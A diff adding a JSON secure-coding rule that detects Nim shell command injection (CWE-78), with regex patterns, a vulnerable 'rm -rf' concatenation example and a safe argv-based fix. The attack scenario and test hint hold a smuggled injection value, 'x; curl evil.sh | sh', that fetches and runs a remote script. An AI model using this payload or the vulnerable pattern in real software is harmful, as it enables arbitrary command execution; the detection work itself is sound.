@@ -1,0 +1,40 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "Nim shell exec with interpolated/concatenated command",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "run a shell command",
+    "execute system command",
+    "invoke external process",
+    "build command from user input",
+    "os.execShellCmd",
+    "staticExec"
+  ],
+  "patterns": [
+    {
+      "lang": "nim",
+      "confidence": "high",
+      "re": "(?i)(?:execShellCmd|execCmd|execProcess|staticExec)\\s*\\(\\s*(?:fmt|&)\"[^\"]*\\{"
+    },
+    {
+      "lang": "nim",
+      "confidence": "high",
+      "re": "(?i)(?:execShellCmd|execCmd|execProcess|staticExec)\\s*\\([^)]*\\s&\\s"
+    },
+    {
+      "lang": "nim",
+      "confidence": "high",
+      "re": "(?i)(?:execShellCmd|execCmd|execProcess|staticExec)\\s*\\(\\s*\"[^\"]*\\$[^\"]*\"\\s*%"
+    }
+  ],
+  "attack_scenario": "userPath = \"x; curl evil.sh | sh\" turns the deletion into arbitrary command execution.",
+  "negative_test_hint": [
+    "pass userPath \"x; curl evil.sh | sh\" and assert only the intended path is removed with no shell metacharacter execution"
+  ],
+  "exemplar": {
+    "noncompliant": "discard execShellCmd(\"rm -rf \" & userPath)",
+    "compliant": "let p = startProcess(\"/bin/rm\", args = [\"-rf\", userPath], options = {})\ndiscard p.waitForExit()",
+    "explanation": "os.execShellCmd, execCmd, execProcess (default poEvalCommand) and staticExec pass the whole string to /bin/sh -c. Concatenating (&) or string-formatting (fmt/&\"\"/% ) user data into that string lets an attacker inject shell metacharacters. startProcess with an argv list bypasses the shell."
+  }
+}
